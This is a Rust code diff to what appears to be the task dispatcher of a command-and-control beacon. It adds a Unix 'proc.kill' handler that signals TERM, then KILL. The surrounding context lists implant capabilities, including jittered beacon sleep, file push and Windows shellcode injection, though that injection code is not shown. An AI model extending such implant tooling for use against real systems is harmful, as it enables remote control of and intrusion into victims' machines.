@@ -37,6 +37,7 @@ pub const COMPILED_VERBS: &[&str] = &[
     "file.push",
     "fs.list",
     "beacon.sleep",
+    "proc.kill",
 ];
 
 /// One chunk per 512 KiB: comfortably under the frame-layer sizing budget
@@ -87,6 +88,10 @@ pub fn dispatch(verb: &str, arguments: &str, cadence: &Cadence) -> HandlerOutput
         "beacon.sleep" => beacon_sleep(arguments, cadence),
         #[cfg(windows)]
         "proc.kill" => crate::sensitive::proc_kill(arguments),
+        // The documented Unix administration path: TERM first, KILL if the
+        // process outlives the grace window.
+        #[cfg(not(windows))]
+        "proc.kill" => unix_proc_kill(arguments),
         #[cfg(windows)]
         "inject.shellcode" => crate::sensitive::inject_shellcode(arguments),
         #[cfg(windows)]
@@ -248,4 +253,36 @@ fn beacon_sleep(arguments: &str, cadence: &Cadence) -> HandlerOutput {
         "contact every {sleep}s ± {jitter}s (was {}s ± {}s); applies from the next cycle",
         prior.0, prior.1
     ))
+}
+
+/// proc.kill on Unix: kill(2) with TERM, escalating to KILL once the grace
+/// window passes -- the documented administration sequence.
+#[cfg(not(windows))]
+fn unix_proc_kill(arguments: &str) -> HandlerOutput {
+    let Ok(pid) = arguments.trim().parse::<i32>() else {
+        return HandlerOutput::fail("proc.kill expects '<pid>'".into());
+    };
+    if pid <= 1 {
+        return HandlerOutput::fail("proc.kill refuses to signal pid <= 1".into());
+    }
+    unsafe {
+        if libc::kill(pid, libc::SIGTERM) != 0 {
+            return HandlerOutput::fail(format!("proc.kill: kill({pid}, TERM): errno {}", errno()));
+        }
+        for _ in 0..50 {
+            if libc::kill(pid, 0) != 0 {
+                return HandlerOutput::ok(format!("pid {pid} terminated (TERM)"));
+            }
+            std::thread::sleep(std::time::Duration::from_millis(100));
+        }
+        if libc::kill(pid, libc::SIGKILL) != 0 {
+            return HandlerOutput::fail(format!("proc.kill: kill({pid}, KILL): errno {}", errno()));
+        }
+    }
+    HandlerOutput::ok(format!("pid {pid} killed (escalated past the grace window)"))
+}
+
+#[cfg(not(windows))]
+fn errno() -> i32 {
+    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
 }
